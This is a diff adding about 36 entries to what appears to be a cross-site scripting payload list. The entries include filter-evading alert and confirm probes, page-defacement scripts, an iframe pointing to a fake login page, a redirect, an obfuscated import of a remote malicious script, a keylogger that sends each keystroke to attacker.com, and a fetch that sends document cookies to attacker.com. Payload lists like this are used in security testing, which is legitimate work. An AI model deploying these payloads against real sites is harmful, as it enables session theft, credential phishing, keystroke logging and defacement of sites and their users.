@@ -164,3 +164,39 @@ Onclick="(prompt(1))"
 OnClick="(prompt`1`)"
 Onclick="([11].map(confirm))"
 <img src=1 href=1 onerror="javascript:alert(1)">
+<img src="x" onerror="alert(1);">
+<A HRef=\" AutoFocus OnFocus=top/**/?.['ev'%2B'al'](imp\u00%36%66rt\u00%32%38'//DomainWithMalicious.js'\u00%32%39)>
+<script> document.querySelector("h1").innerHTML = "Website Defaced"; </script>
+<script>document.body.innerHTML="<h1>Website Defaced</h1>";</script>
+<script>document.body.innerHTML="<h1>Hacked by TehanG07</h1>";</script>
+<iframe src="https://evil-site.com" width="100%" height="100%"></iframe>
+<marquee behavior="scroll" direction="left" style="font-size:50px; color:red;">Hacked by Ethical Hacker</marquee>
+<style>body {background:black; color:red; font-size:50px;} h1 {display:none;}</style>
+<script>document.body.innerHTML = "<h1 style='color:red; font-size:50px; text-align:center;'>Hacked by Ethical Hacker</h1>";document.body.style.backgroundColor = "black";</script>
+<script>localStorage.setItem('deface', '<h1 style="color:red;">Hacked by Ethical Hacker</h1>'); document.body.innerHTML =localStorage.getItem('deface');</script>
+<iframe src="https://evil-site.com/fake-login.html" width="100%" height="100%"></iframe>
+<script>window.location.href = "https://evil-site.com/hacked.html";</script>
+<script>document.onkeypress = function(e) {fetch("https://attacker.com/log?key=" + e.key);}</script>
+<script>fetch("https://attacker.com/log?cookie=" + document.cookie);</script>
+Object.defineProperty(document, 'cookie', { get: function() { alert("XSS Found!"); } })
+<scr<script>ipt>alert(1)</scr<script>ipt>
+"><ScRipT>alert(1)</ScRipT>
+"><img src=x onerror=eval(atob('YWxlcnQoMSk='))>
+<details/open/ontoggle=alert(1)>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+<a href="javascript:alert(1)">Click Me</a>
+<KOnPointerRawUpdate=alert(1)>
+\’/alert(1)//
+JavaScript:alert(1)
+‘-alert(1)-’
+<Script>alert(1)</Script>
+“AutoFocus OnFocus=alert(1)//
+<Svg OnLoad=alert(1)>
+<select><​style></select>
+<svg onload​=alert(1)> 
+"><img src=x onerrora=confirm() onerror​=confirm(1)>
+<dETAILS%0aopen%0aonToGgle%0a%3d%0aa%3dprompt,a(origin)%20x>
+<svg onload​=alert&#0000000040"1")><””>
+<svg%20onx=()%20onload=(confirm)(document.domain)>
+&#34;><track/onerror​=&#x27;confirm\%601\%60&#x27;> 
+ "\/><img%20s+src+c=x%20on+onerror+%20="alert(1)"\>
